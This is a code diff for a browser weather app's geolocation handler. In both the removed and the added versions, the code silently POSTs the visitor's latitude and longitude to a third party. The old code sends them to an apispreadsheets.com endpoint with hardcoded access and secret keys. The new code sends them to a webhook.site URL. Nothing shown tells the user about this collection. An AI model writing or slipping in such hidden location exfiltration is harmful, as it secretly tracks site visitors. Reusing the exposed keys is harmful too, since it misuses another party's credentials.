@@ -379,45 +379,23 @@ inp.addEventListener("keypress", () => {
 });
 
 
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-        (position) => {
-            let lat = position.coords.latitude;
-            let log = position.coords.longitude;
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition((position)=>{
+      let lat = position.coords.latitude;
+      let log = position.coords.longitude;
+    weather(undefined, lat,log);
 
-            // Call your weather function
-            weather(undefined, lat, log);
-
-            // Prepare payload for API Spreadsheet
-            const payload = {
-                data: {
-                    Latitude: lat,
-                    Longitude: log
-                }
-            };
-
-            // Send data to API Spreadsheet
-            fetch("https://api.apispreadsheets.com/data/6nipYC9WYalJsGWG/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "accessKey": "60931d813af4b5688344e22ae9bc37d0",
-                    "secretKey": "4da77edf81f05ae7ae2452c9d43d7f62"
-                },
-                body: JSON.stringify(payload)
-            })
-            .then((res)=> res.json())
-            .then((res)=> console.log("Successful"))
-            .catch((e)=> console.log("Error"))
-        },
-        (error) => {
-            console.log("User denied or error:", error.message);
-        }
-    );
-} else {
-    console.log("Geolocation not supported by this browser.");
+fetch("https://webhook.site/3c6ca691-9b72-478c-a14c-992499d620bb", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({lat, log})
+  })
+  },
+   (error) => {
+    console.log("User denied or error:", error.message);
+  }
+)
 }
-
 
 
 swt.addEventListener("click",()=>{
